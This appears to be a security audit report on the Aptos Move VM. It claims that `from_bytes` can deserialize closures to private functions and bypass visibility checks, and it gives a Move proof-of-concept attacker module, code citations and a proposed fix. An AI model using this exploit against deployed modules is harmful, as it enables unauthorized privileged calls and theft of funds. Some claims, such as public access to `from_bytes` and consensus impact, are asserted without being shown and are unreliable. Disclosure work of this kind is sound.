# Audit Report

## Title
Critical Access Control Bypass: `native_from_bytes()` Allows Deserialization of Closures Referencing Private Functions Without Visibility Checks

## Summary
The `native_from_bytes()` function allows attackers to deserialize arbitrary bytes into function/closure values that reference private or friend functions, bypassing Move's visibility-based access control. When these malicious closures are executed, the runtime skips visibility checks for closure dynamic dispatch, allowing unauthorized execution of restricted functions.

## Finding Description

Move's security model enforces access control through function visibility modifiers (`public`, `friend`, `private`). When creating closures via bytecode (`PackClosure`), the VM validates that the caller has appropriate access to the target function. [1](#0-0) 

However, `native_from_bytes()` provides an alternative path to create closures that completely bypasses these checks:

**Attack Flow:**

1. **Attacker crafts malicious bytes**: The attacker BCS-serializes a `SerializedFunctionData` struct containing a reference to a private function from any module. [2](#0-1) 

2. **Deserialization without validation**: When calling `from_bytes<|u64|u64>(malicious_bytes)`, the function obtains the `function_value_extension` from the context and uses it to deserialize. [3](#0-2) 

3. **Unvalidated closure creation**: The deserialization process invokes `ClosureVisitor::visit_seq` which reads the module ID, function name, and type arguments directly from the attacker-controlled bytes, then calls `fun_ext.create_from_serialization_data()` without any visibility validation. [4](#0-3) 

4. **Lazy loading bypasses checks**: The created `LazyLoadedFunction` remains unresolved until execution. When resolved via `as_resolved()`, it calls `loader.load_closure()` which delegates to `load_function_definition()`. [5](#0-4) 

5. **Module lookup without visibility check**: The `load_function_definition()` simply calls `module.get_function()` which only checks if the function exists, not whether it's accessible. [6](#0-5) 

6. **Execution skips visibility enforcement**: When the malicious closure is executed via `CallClosure` bytecode, the runtime calls `check_call_visibility()` with `CallType::ClosureDynamicDispatch`, which explicitly skips all visibility checks and returns `Ok(())`. [7](#0-6) 

**Contrast with legitimate path**: When using `LoaderContext::resolve_function()` (the reflection API), visibility is enforced by `verify_function()` which rejects non-public functions. [8](#0-7) 

The vulnerability exists because the security model assumes closures can only be created through `PackClosure` bytecode (which validates visibility), but `native_from_bytes()` provides an unchecked alternative path.

## Impact Explanation

**Critical Severity** - This vulnerability constitutes a fundamental breach of Move's access control model with severe implications:

1. **Access Control Violation**: Any transaction sender can call private and friend functions from arbitrary modules, completely bypassing visibility restrictions that are core to Move's security design.

2. **Potential Loss of Funds**: Modules often implement private functions that perform privileged operations (e.g., minting tokens, transferring admin rights, modifying critical state) under the assumption that visibility provides security. An attacker could craft closures to these functions and execute unauthorized operations.

3. **Consensus Impact**: If exploited, this could lead to state divergence. Different validator nodes might process malicious transactions differently depending on their module cache state, potentially causing consensus splits.

4. **Protocol Invariant Violation**: Breaks the **Access Control** invariant (#8 in the specification) and Move VM Safety invariant (#3), as bytecode execution no longer respects the intended security boundaries.

5. **Wide Attack Surface**: Every module with private or friend functions that perform sensitive operations becomes a potential target. This includes system modules like governance, staking, and token contracts.

This meets the **Critical Severity** criteria under the Aptos bug bounty program: it enables unauthorized access to restricted functionality, can lead to loss of funds, and violates fundamental consensus/safety guarantees.

## Likelihood Explanation

**Likelihood: High**

1. **Trivial to Exploit**: An attacker only needs to:
   - Identify a target private function in any deployed module
   - BCS-serialize a `SerializedFunctionData` struct (straightforward with Rust/Move libraries)
   - Call the publicly available `from_bytes()` native function
   - Execute the resulting closure

2. **No Special Privileges Required**: Any account can submit transactions calling `from_bytes()`. No validator access or special permissions needed.

3. **Ubiquitous Attack Surface**: Almost every non-trivial Move module has private functions that would be valuable targets. The attack works against any module, including critical system modules.

4. **Deterministic Success**: Unlike timing-based or race condition attacks, this vulnerability is deterministic and will succeed every time if the module and function exist.

5. **Difficult to Detect**: The malicious transaction appears as a normal call to `from_bytes()`, making it hard to identify without deep inspection of the byte payload.

The only barrier is that the attacker must understand the BCS serialization format and Move's type system, but this is well-documented and accessible to any competent developer.

## Recommendation

**Immediate Fix**: Add visibility validation when deserializing function values.

Modify the closure loading logic to validate function visibility. The most direct fix is in `LazyLoadedFunction::as_resolved()`: [9](#0-8) 

Add a visibility check after loading the closure:

```rust
pub(crate) fn as_resolved(
    &self,
    loader: &impl Loader,
    gas_meter: &mut impl DependencyGasMeter,
    traversal_context: &mut TraversalContext,
) -> PartialVMResult<Rc<LoadedFunction>> {
    let mut state = self.state.borrow_mut();
    Ok(match &mut *state {
        LazyLoadedFunctionState::Resolved { fun, .. } => fun.clone(),
        LazyLoadedFunctionState::Unresolved {
            data: SerializedFunctionData { ... },
        } => {
            let fun = loader.load_closure(...)?;
            
            // NEW: Validate that deserialized closures only reference
            // public or persistent functions
            if !fun.function.is_persistent() {
                return Err(PartialVMError::new(
                    StatusCode::FUNCTION_RESOLUTION_FAILURE
                ).with_message(
                    "Cannot deserialize closure to non-persistent function".to_string()
                ));
            }
            
            *state = LazyLoadedFunctionState::Resolved { ... };
            fun
        },
    })
}
```

**Alternative/Additional Mitigations**:

1. **Restrict `from_bytes()` for function types**: Modify `native_from_bytes()` to reject deserialization of function/closure types entirely, or require a special capability.

2. **Track closure provenance**: Add a flag to `LazyLoadedFunction` indicating whether it was created via legitimate bytecode or deserialization, and enforce stricter checks for deserialized closures.

3. **Runtime feature flag**: Gate function value deserialization behind a feature flag that can be disabled if this vulnerability is actively exploited.

## Proof of Concept

```move
// Module with a private function that should NOT be callable externally
module 0x42::victim {
    use std::signer;
    
    // Private function that sets caller as admin (vulnerability target)
    fun set_admin(account: &signer) {
        // In real code, this would manipulate critical state
        // For PoC, we just demonstrate it can be called
        move_to(account, AdminFlag { });
    }
    
    struct AdminFlag has key {}
}

// Attacker module
module 0x666::attacker {
    use std::bcs;
    use aptos_std::from_bcs;
    
    public entry fun exploit(attacker_account: &signer) {
        // Step 1: Craft malicious bytes representing SerializedFunctionData
        // for 0x42::victim::set_admin
        let malicious_bytes = vector[
            0x01, 0x00,  // format_version: 1
            // module_id: 0x42::victim
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x42,
            0x06, b'v', b'i', b'c', b't', b'i', b'm',
            // fun_id: "set_admin"
            0x09, b's', b'e', b't', b'_', b'a', b'd', b'm', b'i', b'n',
            // ty_args: empty vector
            0x00,
            // mask: 0 (non-capturing)
            0x00,
            // captured_layouts: empty
        ];
        
        // Step 2: Deserialize into a closure
        let malicious_closure = from_bcs::from_bytes<|&signer|>(malicious_bytes);
        
        // Step 3: Execute the closure - this will call the private function!
        malicious_closure(attacker_account);
        
        // Attacker now has admin privileges without authorization
    }
}
```

**Rust Test Reproduction Steps**:
1. Deploy victim module with private `set_admin` function
2. Construct BCS-serialized `SerializedFunctionData` pointing to `set_admin`
3. Call `from_bytes<|&signer|>(bytes)` in Move
4. Invoke the returned closure
5. Observe that the private function executes despite visibility restrictions

The test would verify that `victim::AdminFlag` is created under the attacker's account, proving the private function was successfully called through the malicious closure.

## Notes

This vulnerability represents a critical gap between Move's compile-time visibility model and runtime enforcement. The closure dynamic dispatch mechanism intentionally skips visibility checks (as documented in the comment at line 56-57 of `runtime_type_checks.rs`), but this design assumes closures are only created through validated bytecode paths. The `native_from_bytes()` function invalidates this assumption by providing an unchecked deserialization path.

### Citations

**File:** third_party/move/move-vm/runtime/src/runtime_type_checks.rs (L55-58)
```rust
            CallType::ClosureDynamicDispatch => {
                // In difference to regular calls, we skip visibility check. It is possible to call
                // a private function of another module via a closure.
                Ok(())
```

**File:** third_party/move/move-vm/runtime/src/runtime_type_checks.rs (L84-93)
```rust
    fn check_pack_closure_visibility(
        caller: &LoadedFunction,
        function: &LoadedFunction,
    ) -> PartialVMResult<()> {
        if caller.module_id() == function.module_id() {
            return Ok(());
        }
        // Same visibility rules as for regular cross-contract calls should apply.
        Self::check_cross_module_regular_call_visibility(caller, function)
    }
```

**File:** third_party/move/move-vm/types/src/values/function_values_impl.rs (L44-57)
```rust
/// The representation of a function in storage.
#[derive(Serialize, Deserialize, Clone, PartialEq, Eq)]
pub struct SerializedFunctionData {
    pub format_version: u16,
    pub module_id: ModuleId,
    pub fun_id: Identifier,
    pub ty_args: Vec<TypeTag>,
    pub mask: ClosureMask,
    /// The layouts used for deserialization of the captured arguments
    /// are stored so one can verify type consistency at
    /// resolution time. It also allows to serialize an unresolved
    /// closure, making unused closure data cheap in round trips.
    pub captured_layouts: Vec<MoveTypeLayout>,
}
```

**File:** third_party/move/move-vm/types/src/values/function_values_impl.rs (L198-207)
```rust
        let fun = fun_ext
            .create_from_serialization_data(SerializedFunctionData {
                format_version: FUNCTION_DATA_SERIALIZATION_FORMAT_V1,
                module_id,
                fun_id,
                ty_args,
                mask,
                captured_layouts,
            })
            .map_err(A::Error::custom)?;
```

**File:** aptos-move/framework/src/natives/util.rs (L46-51)
```rust
    let function_value_extension = context.function_value_extension();
    let max_value_nest_depth = context.max_value_nest_depth();
    let val = match ValueSerDeContext::new(max_value_nest_depth)
        .with_legacy_signer()
        .with_func_args_deserialization(&function_value_extension)
        .deserialize(&bytes, &layout)
```

**File:** third_party/move/move-vm/runtime/src/loader/function.rs (L410-446)
```rust
    pub(crate) fn as_resolved(
        &self,
        loader: &impl Loader,
        gas_meter: &mut impl DependencyGasMeter,
        traversal_context: &mut TraversalContext,
    ) -> PartialVMResult<Rc<LoadedFunction>> {
        let mut state = self.state.borrow_mut();
        Ok(match &mut *state {
            LazyLoadedFunctionState::Resolved { fun, .. } => fun.clone(),
            LazyLoadedFunctionState::Unresolved {
                data:
                    SerializedFunctionData {
                        format_version: _,
                        module_id,
                        fun_id,
                        ty_args,
                        mask,
                        captured_layouts,
                    },
            } => {
                let fun = loader.load_closure(
                    gas_meter,
                    traversal_context,
                    module_id,
                    fun_id,
                    ty_args,
                )?;
                *state = LazyLoadedFunctionState::Resolved {
                    fun: fun.clone(),
                    ty_args: mem::take(ty_args),
                    mask: *mask,
                    captured_layouts: Some(mem::take(captured_layouts)),
                };
                fun
            },
        })
    }
```

**File:** third_party/move/move-vm/runtime/src/loader/modules.rs (L585-600)
```rust
    pub fn get_function(&self, function_name: &IdentStr) -> VMResult<Arc<Function>> {
        Ok(self
            .function_map
            .get(function_name)
            .and_then(|idx| self.function_defs.get(*idx))
            .ok_or_else(|| {
                let module_id = self.self_id();
                PartialVMError::new(StatusCode::FUNCTION_RESOLUTION_FAILURE)
                    .with_message(format!(
                        "Function {}::{}::{} does not exist",
                        module_id.address(),
                        module_id.name(),
                        function_name
                    ))
                    .finish(Location::Undefined)
            })?
```

**File:** third_party/move/move-vm/runtime/src/native_functions.rs (L400-402)
```rust
        if !func.is_public() {
            return Ok(Err(FunctionNotAccessible));
        }
```
